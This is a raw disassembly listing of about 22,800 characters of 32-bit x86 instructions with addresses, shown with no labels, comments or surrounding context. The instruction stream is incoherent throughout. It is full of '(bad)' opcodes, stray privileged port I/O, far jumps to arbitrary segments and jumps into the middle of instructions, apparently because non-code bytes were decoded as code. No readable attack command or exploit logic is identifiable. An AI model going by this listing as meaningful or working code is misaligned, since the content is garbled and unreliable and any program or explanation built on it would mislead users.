  4118a7:	nop
  4118a8:	push   es
  4118a9:	add    BYTE PTR [esi+ecx*1],bh
  4118ac:	lods   al,BYTE PTR ds:[esi]
  4118ad:	cmp    esp,DWORD PTR [edi]
  4118af:	adc    ebp,ecx
  4118b1:	pusha  
  4118b2:	cld    
  4118b3:	fs call 0x9029d4e3
  4118b9:	sahf   
  4118ba:	mov    edx,0xaf6b7f68
  4118bf:	loope  0x411863
  4118c1:	jb     0x411889
  4118c3:	inc    esp
  4118c4:	xor    eax,eax
  4118c6:	es retf 
  4118c8:	cmp    al,BYTE PTR [edi+0x6d6b934e]
  4118ce:	ror    al,0x45
  4118d1:	gs jno 0x4118e0
  4118d4:	pop    ebp
  4118d5:	pop    esi
  4118d6:	xchg   BYTE PTR [ebp-0x59bc4517],ch
  4118dc:	cwde   
  4118dd:	cdq    
  4118de:	xor    DWORD PTR ds:0x448e89,ebx
  4118e4:	sti    
  4118e5:	jmp    0x4118cd
  4118e7:	push   ss
  4118e8:	inc    eax
  4118e9:	frstor [esi+0x5b3b1f2e]
  4118ef:	sbb    ebp,DWORD PTR [edx+0x50973bc]
  4118f5:	cwde   
  4118f6:	xchg   esi,eax
  4118f7:	sbb    ah,BYTE PTR [eax+edx*1+0x7d]
  4118fb:	cmc    
  4118fc:	les    edi,FWORD PTR [ebp-0x150067b7]
  411902:	daa    
  411903:	sub    cl,BYTE PTR gs:[esi+0x76]
  411907:	or     bh,dl
  411909:	jp     0x4118b7
  41190b:	and    ebx,esi
  41190d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41190e:	sub    DWORD PTR [edi],esi
  411910:	addr16 fwait
  411912:	inc    ebp
  411913:	ins    BYTE PTR es:[edi],dx
  411914:	les    ebp,FWORD PTR [ebx-0x5473b2db]
  41191a:	fld    DWORD PTR [edi+eiz*1+0x4d]
  41191e:	lea    eax,[edx-0x422cb9e3]
  411924:	jecxz  0x411902
  411926:	add    DWORD PTR fs:[ebp-0x72],eax
  41192a:	inc    edi
  41192b:	ret    
  41192c:	xchg   BYTE PTR [edi-0x60],dl
  41192f:	and    ebp,ebp
  411931:	cwde   
  411932:	and    bl,BYTE PTR [ecx+0x795fd0d1]
  411938:	add    ecx,DWORD PTR [edi]
  41193a:	inc    ebx
  41193b:	fwait
  41193c:	and    esp,ebp
  41193e:	icebp  
  41193f:	nop
  411940:	jg     0x41192a
  411942:	sbb    esp,esp
  411944:	add    dh,BYTE PTR ds:0xa38a0e67
  41194a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41194b:	or     BYTE PTR [ebx],0x36
  41194e:	inc    esi
  41194f:	fidiv  WORD PTR [ebx+0x77]
  411952:	jb     0x411972
  411954:	sbb    cl,BYTE PTR [ebp+0x6cdfd0ab]
  41195a:	pop    edi
  41195b:	mov    esp,edi
  41195d:	imul   ebx,DWORD PTR [edi+0x40],0xd16c03fd
  411964:	sub    al,0xc4
  411966:	out    0xdf,al
  411968:	sub    dh,ah
  41196a:	outs   dx,DWORD PTR ds:[esi]
  41196b:	cmp    eax,0xacf21358
  411970:	(bad)  
  411971:	and    al,0xac
  411973:	xor    BYTE PTR [edi+0xd],bh
  411976:	xchg   ebp,eax
  411977:	sub    bl,cl
  411979:	in     eax,dx
  41197a:	jne    0x4119be
  41197c:	cmp    BYTE PTR ds:0xcb4d9ab4,ch
  411982:	xchg   edx,eax
  411983:	mov    ebp,0x256e941e
  411988:	sbb    BYTE PTR [ecx+0x2c],dh
  41198b:	icebp  
  41198c:	xor    BYTE PTR gs:[esp+esi*2],0xfd
  411991:	loopne 0x411975
  411993:	or     BYTE PTR [edi+0x3f],ah
  411996:	test   eax,0x5616cb6
  41199b:	out    dx,eax
  41199c:	jae    0x41199c
  41199e:	sahf   
  41199f:	inc    eax
  4119a0:	add    al,0x1a
  4119a2:	or     BYTE PTR [ecx+0x4],dh
  4119a5:	pop    ds
  4119a6:	and    DWORD PTR [eax],ebp
  4119a8:	jo     0x4119a9
  4119aa:	daa    
  4119ab:	mov    al,0x36
  4119ad:	sbb    ebx,DWORD PTR [ebx-0x5b]
  4119b0:	add    edi,esp
  4119b2:	sub    al,0x3b
  4119b4:	xlat   BYTE PTR ds:[ebx]
  4119b5:	test   cl,0x64
  4119b8:	aaa    
  4119b9:	dec    ebx
  4119ba:	adc    al,BYTE PTR [edx]
  4119bc:	jne    0x4119d6
  4119be:	inc    ecx
  4119bf:	clc    
  4119c0:	pop    edx
  4119c1:	cmp    bl,al
  4119c3:	mov    DWORD PTR [esi],esi
  4119c5:	xor    al,0x5c
  4119c7:	loopne 0x411a42
  4119c9:	std    
  4119ca:	jg     0x4119ee
  4119cc:	jne    0x411a2f
  4119ce:	sbb    esp,DWORD PTR [ebx+ebx*8-0x274e541c]
  4119d5:	aam    0x1
  4119d7:	xor    DWORD PTR [esi-0x1cac2519],0x3a843124
  4119e1:	push   ss
  4119e2:	or     al,0x55
  4119e4:	sub    ebp,DWORD PTR [ecx+0x168394a4]
  4119ea:	mov    bh,0x33
  4119ec:	dec    esi
  4119ed:	or     BYTE PTR [ebp-0x31671da9],dl
  4119f3:	dec    ebp
  4119f4:	dec    edx
  4119f5:	mov    BYTE PTR [ebx],ch
  4119f7:	aas    
  4119f8:	mov    eax,0xf1e741a2
  4119fd:	arpl   di,di
  4119ff:	xchg   BYTE PTR [ecx-0x50b8dbef],bh
  411a05:	pusha  
  411a06:	mov    ds:0x99214186,al
  411a0b:	lock nop
  411a0d:	(bad)  
  411a0e:	sbb    eax,0x247a5829
  411a13:	dec    edx
  411a14:	push   edx
  411a15:	sbb    eax,0x8fe023a8
  411a1a:	and    eax,0x98993c52
  411a1f:	daa    
  411a20:	lods   al,BYTE PTR ds:[esi]
  411a21:	push   edx
  411a22:	inc    esp
  411a23:	outs   dx,BYTE PTR ds:[esi]
  411a24:	adc    DWORD PTR [ebx+0x77],0xffffffdb
  411a28:	loop   0x411a99
  411a2a:	jne    0x411aa6
  411a2c:	(bad)  
  411a2d:	jmp    0x411a84
  411a2f:	push   ecx
  411a30:	imul   ecx,esp,0x19054782
  411a36:	add    al,0xc6
  411a38:	mov    dh,0x91
  411a3a:	ds jbe 0x411a3a
  411a3d:	(bad)  
  411a3e:	icebp  
  411a3f:	fstp   QWORD PTR [ebx-0x6a]
  411a42:	aaa    
  411a43:	mov    esp,0x322434b0
  411a48:	dec    esi
  411a49:	fwait
  411a4a:	in     eax,dx
  411a4b:	add    BYTE PTR es:[esi],bl
  411a4e:	cmp    eax,0x126961f9
  411a53:	dec    esp
  411a54:	scas   al,BYTE PTR es:[edi]
  411a55:	jmp    edi
  411a57:	(bad)  
  411a59:	adc    al,0x6
  411a5b:	or     DWORD PTR [eax],esi
  411a5d:	cmp    eax,0xec3bb70d
  411a62:	sahf   
  411a63:	push   es
  411a64:	pop    es
  411a65:	and    al,bh
  411a67:	loop   0x411abe
  411a69:	cli    
  411a6a:	lods   eax,DWORD PTR ds:[esi]
  411a6b:	add    edx,DWORD PTR [ecx+0x3f]
  411a6e:	cmp    ecx,DWORD PTR [ecx+0x3a]
  411a71:	lods   eax,DWORD PTR ds:[esi]
  411a72:	pop    edx
  411a73:	xchg   esp,eax
  411a74:	loop   0x411a4d
  411a76:	sub    ecx,DWORD PTR [ebp+0x68]
  411a79:	lahf   
  411a7a:	popa   
  411a7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a7d:	mov    bl,0xfb
  411a7f:	sub    eax,0x9b6c94d8
  411a84:	dec    ecx
  411a85:	ror    DWORD PTR [edi+0x19f24cb4],1
  411a8b:	mov    DWORD PTR [ecx-0x1f],0xb0616a4d
  411a92:	and    BYTE PTR [ebx],ah
  411a94:	and    dh,dl
  411a96:	scas   al,BYTE PTR es:[edi]
  411a97:	sbb    DWORD PTR [edi],0x36a3ae6
  411a9d:	xchg   DWORD PTR [ebp-0x799412f2],ebp
  411aa3:	shl    DWORD PTR [ebx+0x73dc66bc],cl
  411aa9:	jnp    0x411a9e
  411aab:	cmp    dl,BYTE PTR [esi-0x7b601e80]
  411ab1:	aad    0x99
  411ab3:	test   DWORD PTR [esi],edi
  411ab5:	addr16 rcl ebx,0xc0
  411ab9:	push   es
  411aba:	mov    WORD PTR [edi*4-0x96ff934],es
  411ac1:	xchg   edx,eax
  411ac2:	imul   esp,DWORD PTR [ecx+0x3ad9d61a],0xffffffd8
  411ac9:	jb     0x411ae3
  411acb:	jmp    0xd200:0x51d1429b
  411ad2:	jg     0x411afd
  411ad4:	mov    esp,0x431391fb
  411ad9:	sbb    al,0x84
  411adb:	ss fucomip st,st(6)
  411ade:	and    eax,0x544c52ac
  411ae3:	stc    
  411ae4:	push   esi
  411ae5:	xchg   edx,eax
  411ae6:	ret    
  411ae7:	sbb    BYTE PTR [eax-0x6d],bl
  411aea:	mov    ah,0x89
  411aec:	bnd jp 0x411b0d
  411aef:	adc    al,0x44
  411af1:	mov    al,ds:0x692e8f97
  411af6:	adc    DWORD PTR [edi+ecx*8+0x7d9a5539],ebp
  411afd:	lods   eax,DWORD PTR ds:[esi]
  411afe:	dec    esp
  411aff:	push   ebx
  411b00:	mov    al,ds:0x920cb773
  411b05:	into   
  411b06:	fild   WORD PTR [eax-0x4f754724]
  411b0c:	mov    WORD PTR ds:0x8a8ff1f3,fs
  411b12:	aas    
  411b13:	repnz push 0xb61929e3
  411b19:	and    BYTE PTR [ebp+0x67908939],bl
  411b1f:	int3   
  411b20:	xchg   esi,eax
  411b21:	xor    eax,DWORD PTR [ebp-0x4d323ed0]
  411b27:	jb     0x411b00
  411b29:	sub    BYTE PTR [edi+edx*1-0x136242d6],ah
  411b30:	pop    edx
  411b31:	int3   
  411b32:	cs in  eax,dx
  411b34:	call   0xbbe4:0xb55dd393
  411b3b:	lods   eax,DWORD PTR ds:[esi]
  411b3c:	retf   
  411b3d:	fidiv  WORD PTR [eax-0x72]
  411b40:	mov    ds:0x58fa59a2,al
  411b45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b46:	test   al,0x68
  411b48:	stos   BYTE PTR es:[edi],al
  411b49:	fiadd  WORD PTR [edx]
  411b4b:	push   ebx
  411b4c:	(bad)
  411b4f:	cmp    eax,0xa7e84015
  411b54:	imul   esp,DWORD PTR [esi+0x1d7325b5],0xf339ebcb
  411b5e:	and    al,0x46
  411b60:	lods   al,BYTE PTR ds:[esi]
  411b61:	cwde   
  411b62:	imul   esp,DWORD PTR [esi+0x12],0xfffffff3
  411b66:	data16 jle 0x411b91
  411b69:	sbb    ah,dh
  411b6b:	or     al,0x95
  411b6d:	(bad)  
  411b6f:	mov    dh,0xe9
  411b71:	scas   al,BYTE PTR es:[edi]
  411b72:	std    
  411b73:	jnp    0x411b0e
  411b75:	jmp    0x4bed:0xc9cb5ebc
  411b7c:	test   BYTE PTR ds:0xabe92507,al
  411b82:	out    dx,eax
  411b83:	jnp    0x411be3
  411b85:	jle    0x411be3
  411b87:	je     0x411b79
  411b89:	stc    
  411b8a:	sbb    eax,0x20ea9d93
  411b8f:	inc    ecx
  411b90:	jb     0x411bed
  411b92:	lock mov ecx,DWORD PTR gs:[ebx]
  411b96:	push   ds
  411b97:	in     eax,dx
  411b98:	push   ds
  411b99:	cli    
  411b9a:	sub    al,0xb6
  411b9c:	xor    DWORD PTR [ebp+0x62],edi
  411b9f:	xor    BYTE PTR [eax-0x78],ch
  411ba2:	jb     0x411b44
  411ba4:	sbb    eax,eax
  411ba6:	xchg   ecx,eax
  411ba7:	push   cs
  411ba8:	ja     0xfcf7bfe1
  411bae:	adc    BYTE PTR [ecx-0x66],cl
  411bb1:	xchg   ebx,eax
  411bb2:	and    al,0xaf
  411bb4:	jmp    0x411bd9
  411bb6:	iret   
  411bb7:	adc    eax,0x1a94cdf9
  411bbc:	and    BYTE PTR [ebx],cl
  411bbe:	push   esi
  411bbf:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411bc1:	xor    DWORD PTR [eax-0x36],eax
  411bc4:	in     eax,0x26
  411bc6:	jns    0x411c41
  411bc8:	jo     0x411be4
  411bca:	push   0x40
  411bcc:	sbb    ebx,edi
  411bce:	xchg   esp,eax
  411bcf:	xor    bh,BYTE PTR [edi-0x15]
  411bd2:	xor    DWORD PTR [ebx+0x63],0xffffff95
  411bd6:	ficomp DWORD PTR [ebx+0xa9af586]
  411bdc:	ret    
  411bdd:	inc    esp
  411bde:	add    BYTE PTR [edi+0x7f],0x42
  411be2:	hlt    
  411be3:	jnp    0x411be1
  411be5:	xchg   ecx,eax
  411be6:	retf   0xd45
  411be9:	jnp    0x411c41
  411beb:	pop    ebx
  411bec:	out    0xe8,al
  411bee:	push   cs
  411bef:	dec    esp
  411bf0:	das    
  411bf1:	and    BYTE PTR [ecx+eax*2],0xdf
  411bf5:	dec    esi
  411bf6:	jno    0x411c36
  411bf8:	aaa    
  411bf9:	add    eax,0x74df762a
  411bfe:	mov    bl,0x1c
  411c00:	push   ecx
  411c01:	inc    ecx
  411c02:	xlat   BYTE PTR ds:[ebx]
  411c03:	call   0x383c3950
  411c08:	sub    ecx,ebx
  411c0a:	aam    0xee
  411c0c:	lods   al,BYTE PTR ds:[esi]
  411c0d:	mov    al,ds:0xfa36e8b2
  411c12:	cmp    bl,dl
  411c14:	adc    edi,DWORD PTR ds:0xe1e13092
  411c1a:	jbe    0x411c8a
  411c1c:	fsubp  st(4),st
  411c1e:	je     0x411c84
  411c20:	sar    BYTE PTR [ebx-0x6098ea74],1
  411c26:	(bad)  
  411c27:	inc    ebp
  411c28:	daa    
  411c29:	push   0x16195c28
  411c2e:	fmul   QWORD PTR [edi]
  411c30:	pushf  
  411c31:	scas   eax,DWORD PTR es:[edi]
  411c32:	adc    esp,ecx
  411c34:	jmp    FWORD PTR [esi]
  411c36:	adc    eax,0x3748dbb9
  411c3b:	hlt    
  411c3c:	pop    ebx
  411c3d:	test   DWORD PTR [eax-0x2fc12155],edi
  411c43:	sti    
  411c44:	call   0x54ba:0x28f9f2a5
  411c4b:	push   0x444c6463
  411c50:	and    BYTE PTR [edx+ebx*2+0xe],bh
  411c54:	xlat   BYTE PTR ds:[ebx]
  411c55:	(bad)  
  411c56:	jo     0x411c68
  411c58:	or     al,0xdc
  411c5a:	loopne 0x411bf4
  411c5c:	push   edx
  411c5d:	sbb    DWORD PTR [ebx+0x7a29ff27],esp
  411c63:	xchg   ebx,esp
  411c65:	ss pop ds
  411c67:	inc    edi
  411c68:	cmp    al,0xed
  411c6a:	mov    edi,0xf0b02d7d
  411c6f:	pop    ebp
  411c70:	outs   dx,DWORD PTR ds:[esi]
  411c71:	jns    0x411c2b
  411c73:	mov    ?,WORD PTR [esi-0x284b61d2]
  411c79:	fisub  DWORD PTR [edx]
  411c7b:	jl     0x411ca6
  411c7d:	sub    ebp,0xffffff81
  411c80:	jge    0x411cb7
  411c82:	inc    ebp
  411c83:	push   es
  411c84:	and    DWORD PTR [ecx+0x72],edx
  411c87:	jae    0x411c7a
  411c89:	cld    
  411c8a:	into   
  411c8b:	mov    BYTE PTR [eax],0x6d
  411c8e:	dec    esp
  411c8f:	adc    eax,0xde92edec
  411c94:	mov    ah,BYTE PTR [edx]
  411c96:	pop    ds
  411c97:	arpl   WORD PTR [edi],bx
  411c99:	add    esi,DWORD PTR [ecx+0xc]
  411c9c:	cdq    
  411c9d:	or     eax,0xfc1550d2
  411ca2:	out    0xab,eax
  411ca4:	add    esi,DWORD PTR [ecx+0x76036b0c]
  411caa:	sbb    ebp,DWORD PTR [ecx]
  411cac:	push   ds
  411cad:	sub    edx,DWORD PTR [bx-0x6bc4]
  411cb2:	in     eax,dx
  411cb3:	fnstcw WORD PTR [eax-0x3c]
  411cb6:	jns    0x411cd4
  411cb8:	or     eax,edx
  411cba:	js     0x411cfd
  411cbc:	not    DWORD PTR [ecx]
  411cbe:	mov    eax,ds:0xe1080095
  411cc3:	outs   dx,DWORD PTR ds:[esi]
  411cc4:	(bad)  
  411cc5:	sbb    DWORD PTR [eax-0x48],0xffffff9c
  411cc9:	dec    eax
  411cca:	sub    eax,0xe46d1877
  411ccf:	iret   
  411cd0:	dec    edi
  411cd1:	cmp    esp,DWORD PTR [edi+0x68]
  411cd4:	jle    0x411d0a
  411cd6:	mov    dh,0xaa
  411cd8:	sbb    DWORD PTR [esi],edx
  411cda:	scas   eax,DWORD PTR es:[edi]
  411cdb:	dec    ebx
  411cdc:	push   ecx
  411cdd:	sbb    al,0xcc
  411cdf:	imul   esi,DWORD PTR [ebx+0x5a],0xffffffc0
  411ce3:	in     al,0x22
  411ce5:	arpl   WORD PTR [eax+0x6163a288],sp
  411ceb:	mov    ecx,DWORD PTR fs:[esi+0x51]
  411cef:	idiv   eax
  411cf1:	or     edx,ecx
  411cf3:	push   es
  411cf4:	or     ah,dh
  411cf6:	jno    0x411d12
  411cf8:	sub    BYTE PTR [ecx+0x74],ch
  411cfb:	retf   0xf60d
  411cfe:	pop    ecx
  411cff:	fist   WORD PTR [eax+0x7b1eb9a6]
  411d05:	mov    cl,0x19
  411d07:	cmp    BYTE PTR [edi-0x8],0x4
  411d0b:	xchg   ebx,eax
  411d0c:	sbb    eax,0x179b1ca1
  411d11:	dec    edi
  411d12:	jle    0x411cfb
  411d14:	dec    esi
  411d15:	mov    eax,0xf3dfc5a7
  411d1a:	cmp    bl,ch
  411d1c:	pusha  
  411d1d:	mov    cl,0x64
  411d1f:	outs   dx,BYTE PTR ds:[esi]
  411d20:	sahf   
  411d21:	xchg   BYTE PTR [eax],ah
  411d23:	dec    esp
  411d24:	sbb    esp,esi
  411d26:	pop    es
  411d27:	or     ebp,DWORD PTR [edi]
  411d29:	lock push 0xffffff84
  411d2c:	or     dl,BYTE PTR [eax+0x6619e1b2]
  411d32:	xchg   ecx,eax
  411d33:	and    al,0xa7
  411d35:	repz sbb eax,esi
  411d38:	jge    0x411d01
  411d3a:	jg     0x411d9f
  411d3c:	in     al,0x99
  411d3e:	and    ebp,ebx
  411d40:	fcomp  DWORD PTR [edi+ecx*8+0x395a3e7]
  411d47:	ss xchg esp,eax
  411d49:	xchg   ch,bh
  411d4b:	push   esp
  411d4c:	repnz in eax,dx
  411d4e:	lea    edx,[eax-0x66]
  411d51:	push   0x404e2d73
  411d56:	mov    dh,0x5d
  411d58:	ss jl  0x411d93
  411d5b:	inc    ecx
  411d5c:	mov    esp,0xac4bc6e1
  411d61:	hlt    
  411d62:	aaa    
  411d63:	push   cs
  411d64:	jno    0x411d9b
  411d66:	jns    0x411db9
  411d68:	dec    ebx
  411d69:	sub    al,0x52
  411d6b:	pop    es
  411d6c:	mov    edx,0x8b294bd6
  411d71:	pop    eax
  411d72:	add    eax,0x9bc2e083
  411d77:	jmp    0xde1cfde3
  411d7c:	pop    esi
  411d7d:	fcmovu st,st(1)
  411d7f:	sbb    BYTE PTR [eax],cl
  411d81:	ret    
  411d82:	sbb    eax,0xce48ae6a
  411d87:	mov    esi,0x59609788
  411d8c:	mov    eax,ds:0xdfa3ee4d
  411d91:	shl    BYTE PTR es:[ebp+0x5240ed47],cl
  411d98:	or     al,0xe1
  411d9a:	js     0x411df2
  411d9c:	or     cl,BYTE PTR [ebp+0x1a]
  411d9f:	(bad)  
  411da0:	das    
  411da1:	push   edi
  411da2:	xor    BYTE PTR [ebx+0x432fc7dc],bl
  411da8:	test   al,0x37
  411daa:	out    dx,eax
  411dab:	xchg   edx,eax
  411dac:	in     eax,0xa8
  411dae:	in     eax,0xd3
  411db0:	jnp    0x411dcd
  411db2:	dec    edi
  411db3:	call   0xa9ada90e
  411db8:	xor    al,0xd2
  411dba:	sub    eax,0xf1008104
  411dbf:	inc    esi
  411dc0:	dec    edx
  411dc1:	mov    ecx,0xb63fe639
  411dc6:	mov    eax,ds:0xa317a3f0
  411dcb:	iret   
  411dcc:	cli    
  411dcd:	adc    ah,BYTE PTR [ebp+0x68]
  411dd0:	clc    
  411dd1:	or     esp,DWORD PTR [esi+ebx*8]
  411dd4:	(bad)  
  411dd5:	push   eax
  411dd6:	push   ds
  411dd7:	push   0xffffff88
  411dd9:	je     0x411ddc
  411ddb:	inc    ebp
  411ddc:	cld    
  411ddd:	fwait
  411dde:	sahf   
  411ddf:	fidiv  WORD PTR [ecx+edi*8+0x64a76050]
  411de6:	ret    0xf9c2
  411de9:	dec    ecx
  411dea:	das    
  411deb:	out    0x9,al
  411ded:	mov    ebx,0x90cef487
  411df2:	mov    DWORD PTR [ebx+0x34],esi
  411df5:	jne    0x411e69
  411df7:	aam    0x2f
  411df9:	or     ecx,ecx
  411dfb:	cmp    ebp,ecx
  411dfd:	jnp    0x411e05
  411dff:	(bad)  
  411e00:	mov    esi,0x3686eca2
  411e05:	shr    ebp,1
  411e07:	or     BYTE PTR [eax],dl
  411e09:	in     eax,dx
  411e0a:	pop    ss
  411e0b:	adc    esp,DWORD PTR gs:[ebp-0x31922d24]
  411e12:	or     BYTE PTR [ecx],cl
  411e14:	icebp  
  411e15:	mov    edx,DWORD PTR [ecx*2-0x77b30303]
  411e1c:	enter  0x8e1e,0x78
  411e20:	jp     0x411e1c
  411e22:	and    BYTE PTR [edi],dl
  411e24:	xor    dl,dl
  411e26:	xor    DWORD PTR [esp+ecx*4-0x2c],ecx
  411e2a:	popa   
  411e2b:	in     al,dx
  411e2c:	mov    dh,cl
  411e2e:	xchg   ebp,eax
  411e2f:	and    al,0xa
  411e31:	scas   eax,DWORD PTR es:[edi]
  411e32:	fist   WORD PTR [esi]
  411e34:	xor    edx,DWORD PTR ds:0xeb0bfe6f
  411e3a:	xchg   esi,eax
  411e3b:	fld    st(7)
  411e3d:	test   BYTE PTR [esi],0xa6
  411e40:	repz ret 0xc171
  411e44:	sub    eax,0x4619a330
  411e49:	add    ah,bl
  411e4b:	(bad)  
  411e4c:	mov    al,0xe
  411e4e:	inc    ebx
  411e4f:	sub    cl,BYTE PTR [ecx-0x3dfc010]
  411e55:	adc    eax,0xba61d734
  411e5a:	adc    esp,esp
  411e5c:	xor    ebx,DWORD PTR [esi+0x19]
  411e5f:	btr    edx,esp
  411e62:	arpl   WORD PTR [eax+0x63],dx
  411e65:	pop    ecx
  411e66:	push   0xdf3b287e
  411e6b:	ja     0x411e4e
  411e6d:	pop    esp
  411e6e:	jmp    DWORD PTR [ebx+ebx*8-0x9]
  411e72:	jne    0x411e4e
  411e74:	mov    dh,0x93
  411e76:	mov    ebx,0xe2fd4194
  411e7b:	mov    ch,0xc1
  411e7d:	jg     0x411e3b
  411e7f:	xchg   esp,eax
  411e80:	sbb    al,0x82
  411e82:	pushw  ds
  411e84:	or     al,0xba
  411e86:	inc    eax
  411e87:	jns    0x411e5b
  411e89:	retf   0x7413
  411e8c:	xor    al,0x57
  411e8e:	and    ah,BYTE PTR [ecx]
  411e90:	lea    esp,[eax]
  411e92:	(bad)  
  411e93:	dec    esp
  411e94:	xchg   ecx,eax
  411e95:	mov    edi,0x888cce9c
  411e9a:	mov    fs,WORD PTR [ebx-0x5f]
  411e9d:	mov    ds:0xee84f8d2,eax
  411ea2:	out    0x1,al
  411ea4:	pop    eax
  411ea5:	imul   esp,DWORD PTR [esi-0x4e01ddad],0x5eb89eb0
  411eaf:	sub    DWORD PTR [ecx],ebx
  411eb1:	xor    cl,dh
  411eb3:	jbe    0x411e58
  411eb5:	(bad)  [ebx]
  411eb7:	or     BYTE PTR [eax-0x43f51a94],bh
  411ebd:	xor    eax,0x7142b3fd
  411ec2:	sbb    esi,DWORD PTR [ebp+0x2c]
  411ec5:	repz pop ds
  411ec7:	mov    dl,0x84
  411ec9:	inc    esp
  411eca:	adc    al,0xd8
  411ecc:	(bad)  
  411ecd:	and    DWORD PTR [eax-0x816f705],0x1a8c52d0
  411ed7:	add    BYTE PTR [eax],bh
  411ed9:	call   0x280971be
  411ede:	mov    bl,0xfd
  411ee0:	outs   dx,DWORD PTR ds:[esi]
  411ee1:	enter  0xd5b5,0xc6
  411ee5:	jle    0x411e87
  411ee7:	outs   dx,DWORD PTR ds:[esi]
  411ee8:	gs xchg ecx,eax
  411eea:	mov    edx,0x85587946
  411eef:	mov    eax,ds:0xa7a2e2ed
  411ef4:	and    dl,BYTE PTR [edx+ecx*2+0x3bfc8b26]
  411efb:	mov    ds:0xe27a5568,al
  411f00:	loope  0x411ec9
  411f02:	ins    DWORD PTR es:[edi],dx
  411f03:	push   ebx
  411f04:	and    edi,esi
  411f06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f07:	mov    edi,0x7cfba1bb
  411f0c:	leave  
  411f0d:	(bad)  [ebx-0x7]
  411f10:	and    DWORD PTR [edx],0x63a9e6d5
  411f16:	mov    al,0x38
  411f18:	cmp    BYTE PTR [esi-0x5ea782a9],0x92
  411f1f:	lds    ebp,FWORD PTR [edi]
  411f21:	les    ebp,FWORD PTR [edx-0x4b870aea]
  411f27:	shr    esi,0x10
  411f2a:	mov    ecx,DWORD PTR [edx-0x145318a2]
  411f30:	sbb    BYTE PTR [eax-0x2d],cl
  411f33:	fisttp QWORD PTR [ebx+ebp*8]
  411f36:	mov    esp,esp
  411f38:	sbb    al,0x68
  411f3a:	(bad)  
  411f3b:	xor    bl,BYTE PTR [edi]
  411f3d:	cmp    BYTE PTR [ebx],dh
  411f3f:	call   0x7fdd:0x637656ca
  411f46:	arpl   WORD PTR [eax-0x3f],ax
  411f49:	pminsw mm6,QWORD PTR [ecx+0x49]
  411f4d:	cs pop ds
  411f4f:	adc    eax,0xc76597f8
  411f54:	in     al,dx
  411f55:	jp     0x411f5e
  411f57:	cwde   
  411f58:	mov    esp,ecx
  411f5a:	push   ss
  411f5b:	aam    0xd8
  411f5d:	mov    edx,0xcfafd963
  411f62:	xchg   ebp,eax
  411f63:	inc    ecx
  411f64:	rep stos BYTE PTR es:[edi],al
  411f66:	or     eax,0x18c0d30
  411f6b:	add    eax,0xf631a0d3
  411f70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f71:	test   eax,0x9b0eb5b8
  411f76:	into   
  411f77:	bound  eax,QWORD PTR [ebp-0x62]
  411f7a:	nop
  411f7b:	mov    ds:0x832aaa55,eax
  411f80:	jae    0x411f6a
  411f82:	push   ds
  411f83:	jo     0x411fb4
  411f85:	sub    ch,BYTE PTR [ecx+0x73be3b18]
  411f8b:	mov    al,ds:0x1ad93774
  411f90:	jno    0x41200f
  411f92:	jne    0x411fd3
  411f94:	loope  0x411fe0
  411f96:	push   edi
  411f97:	mov    al,0xcf
  411f99:	push   ecx
  411f9a:	inc    edx
  411f9b:	ret    0xd1f7
  411f9e:	pop    ecx
  411f9f:	out    dx,eax
  411fa0:	aad    0x39
  411fa2:	sbb    dh,cl
  411fa4:	lea    esi,[eax]
  411fa6:	(bad)  
  411fa7:	sub    edi,ecx
  411fa9:	hlt    
  411faa:	cmp    BYTE PTR [eax-0x40],bl
  411fad:	pop    ebx
  411fae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411faf:	dec    ebx
  411fb0:	mov    ds:0xfeefcfde,al
  411fb5:	sub    ah,BYTE PTR [edi]
  411fb7:	cmp    eax,0x236494fa
  411fbc:	cmp    esi,DWORD PTR [ebx+0x183616d7]
  411fc2:	mov    dh,0xf8
  411fc4:	push   eax
  411fc5:	push   cs
  411fc6:	out    dx,eax
  411fc7:	add    DWORD PTR [eax],0xffffffdf
  411fca:	retf   
  411fcb:	xchg   DWORD PTR [eax],esi
  411fcd:	push   ecx
  411fce:	mov    bh,0x25
  411fd0:	rcl    bh,0x24
  411fd3:	jge    0x411f92
  411fd5:	inc    esp
  411fd6:	js     0x411f8b
  411fd8:	push   0xa8e9682c
  411fdd:	pop    esp
  411fde:	ins    DWORD PTR es:[edi],dx
  411fdf:	pop    ebx
  411fe0:	icebp  
  411fe1:	mov    esp,0x27ed4171
  411fe6:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  411fe8:	lea    edx,[ebx+0x11]
  411feb:	(bad)  
  411fec:	mov    eax,0x6e49cf5
  411ff1:	sbb    eax,0xef4a9f14
  411ff6:	fcom   QWORD PTR [eax+0x716dc2c7]
  411ffc:	cmp    DWORD PTR [edi],eax
  411ffe:	test   DWORD PTR [edi],esp
  412000:	data16 (bad) 
  412003:	mov    dl,0x60
  412005:	aas    
  412006:	jecxz  0x41205d
  412008:	in     al,dx
  412009:	loopne 0x411ff8
  41200b:	pop    eax
  41200c:	bound  esp,QWORD PTR [edx]
  41200e:	int3   
  41200f:	add    BYTE PTR [edx+0x7a9374c6],0x66
  412016:	jl     0x411fa6
  412018:	outs   dx,DWORD PTR ds:[esi]
  412019:	ficomp WORD PTR [ebp-0x6862d731]
  41201f:	(bad)  
  412020:	in     al,dx
  412021:	and    DWORD PTR [ecx+0x3f],0xffffffc1
  412025:	xor    DWORD PTR [ecx-0x35],eax
  412028:	mov    dh,0xf1
  41202a:	push   ebp
  41202b:	scas   al,BYTE PTR es:[edi]
  41202c:	xor    eax,0x9960bc19
  412031:	pop    ecx
  412032:	push   bp
  412034:	push   ecx
  412035:	in     eax,0x51
  412037:	fidivr WORD PTR [ebp+ebp*2-0x5f]
  41203b:	cvtdq2ps xmm3,xmm6
  41203e:	loope  0x4120a1
  412040:	sbb    ebx,DWORD PTR [edi+0x56268b93]
  412046:	cmp    ecx,DWORD PTR [eax-0x6a4557b7]
  41204c:	push   ds
  41204d:	mov    ebx,0x214ccebf
  412052:	add    dh,BYTE PTR [ebx+0x5d]
  412055:	mov    ah,BYTE PTR [ebx+0x1f1ad5df]
  41205b:	mov    ebp,0xb24681c7
  412060:	push   0xffffffb6
  412062:	or     eax,0x43e1db0a
  412067:	add    BYTE PTR [esi+ebx*2-0x17],ah
